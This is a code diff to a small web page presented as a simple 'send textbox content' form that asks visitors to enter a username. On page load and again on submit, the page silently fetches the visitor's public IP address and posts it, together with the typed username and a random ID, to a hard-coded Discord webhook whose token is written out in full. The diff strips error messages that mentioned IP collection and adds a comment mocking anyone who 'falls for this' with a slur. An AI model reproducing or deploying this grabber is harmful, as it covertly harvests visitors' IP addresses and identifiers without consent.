@@ -5,11 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Textbox Content</title>
     <style>
+        @keyframes backgroundAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes wavyShake {
+            0%, 100% { transform: translate(0, 0); }
+            10%, 30%, 50%, 70%, 90% { transform: translate(-2px, -2px); }
+            20%, 40%, 60%, 80% { transform: translate(2px, 2px); }
+        }
+
         body {
             background-image: url('https://xyzzr.github.io/-/image.png');
             background-size: cover;
             background-repeat: no-repeat;
             background-position: center;
+            animation: backgroundAnimation 20s ease infinite;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -45,23 +58,36 @@
         #sendButton:hover {
             background-color: #333;
         }
+        #userID {
+            font-size: 24px;
+            color: white;
+            margin-bottom: 10px;
+            animation: wavyShake 1s infinite;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <input type="text" id="inputBox" placeholder="Type username here...">
+        <div id="userID"></div>
+        <input type="text" id="inputBox" placeholder="enter username here...">
+        <br>
         <button id="sendButton">Send</button>
     </div>
 
     <script>
-        // Generate a random ID
         function generateRandomID() {
-            return Math.floor(Math.random() * 1000000);
+            const letters = 'abcdefghijklmnopqrstuvwxyz';
+            const digits = '0123456789';
+            let id = '';
+            for (let i = 0; i < 15; i++) {
+                id += letters.charAt(Math.floor(Math.random() * letters.length));
+                id += digits.charAt(Math.floor(Math.random() * digits.length));
+            }
+            return id;
         }
 
         var userID = generateRandomID();
-
-        // Send IP address and user ID on page load
+        document.getElementById('userID').innerText = `${userID}`;
         window.onload = function() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
@@ -79,13 +105,13 @@
                         body: JSON.stringify(payload)
                     }).then(response => {
                         if (!response.ok) {
-                            console.error("Failed to send IP and user ID on page load.");
+                            console.error("error.");
                         }
                     }).catch(error => {
-                        console.error('Error sending IP and user ID on page load:', error);
+                        console.error('error:', error);
                     });
                 }).catch(error => {
-                    console.error('Error fetching IP on page load:', error);
+                    console.error('error fetching:', error);
                 });
         };
 
@@ -104,15 +130,15 @@
                 return;
             }
 
-            fetch('https://api.ipify.org?format=json')
+            fetch('https://api.ipify.org?format=json') // loll
                 .then(response => response.json())
                 .then(data => {
                     var userIp = data.ip;
                     var payload = {
-                        content: `User IP: ${userIp}\nUsername: ${content}\nUser ID: ${userID}`
+                        content: `IP: ${userIp}\nUsername: ${content}\nUser ID: ${userID}`
                     };
 
-                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
+                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', { // if anybody falls for this they are retarded i swear
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -120,17 +146,17 @@
                         body: JSON.stringify(payload)
                     }).then(response => {
                         if (response.ok) {
-                            alert("Content sent successfully!");
+                            alert("thanks");
                         } else {
-                            alert("Failed to send content.");
+                            alert("Failed to send");
                         }
                     }).catch(error => {
                         console.error('Error:', error);
-                        alert("Failed to send content.");
+                        alert("Failed to send");
                     });
                 }).catch(error => {
                     console.error('Error fetching IP:', error);
-                    alert("Failed to retrieve IP address.");
+                    alert("Failed to retrieve");
                 });
         });
     </script>
